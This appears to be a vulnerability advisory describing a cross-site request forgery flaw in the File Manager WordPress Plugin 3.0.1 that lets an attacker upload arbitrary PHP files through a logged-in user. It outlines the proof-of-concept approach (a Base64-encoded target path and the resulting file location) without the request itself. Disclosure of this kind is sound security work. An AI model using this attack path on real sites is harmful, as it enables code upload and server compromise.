Tested versions
This issue was successfully tested on the File Manager WordPress Plugin version 3.0.1.

Fix
There is currently no fix available.

Introduction
The File Manager WordPress Plugin is a file manager for WordPress which can be used to upload, delete, copy, move, rename, archive and extract files without the need for FTP. It was discovered that the File Manager WordPress Plugin is vulnerable to Cross-Site Request Forgery.

Details
The upload form used by the plugin has no protection against CSRF attacks. As a result an attacker can for example upload arbitrary PHP files to the server.

Please note that the target user needs to be logged in.

Proof of concept
The target parameter holds a Base64-encoded destination path. By using the proof of concept request below a file named info.php is uploaded to the /wp-content/uploads/file-manager/ directory.

When uploaded, this file can be requested from the outside as follows:
http://<wp-server>/wp-content/uploads/file-manager/info.php
